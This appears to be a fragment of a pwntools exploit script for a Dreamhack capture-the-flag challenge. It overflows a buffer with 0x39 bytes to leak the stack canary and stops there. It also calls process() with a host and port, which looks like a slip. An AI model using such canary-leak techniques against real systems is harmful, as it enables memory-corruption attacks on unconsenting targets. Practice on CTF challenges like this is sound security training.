from pwn import *

#host3.dreamhack.games 16597

p = process("host3.dreamhack.games", 16597)
context.log_level="debug"

buf = b'A'*0x39
p.sendafter(b'Buf: ',buf)
p.recvuntil(buf)
canary = b'\x00'+p.recvn(7)

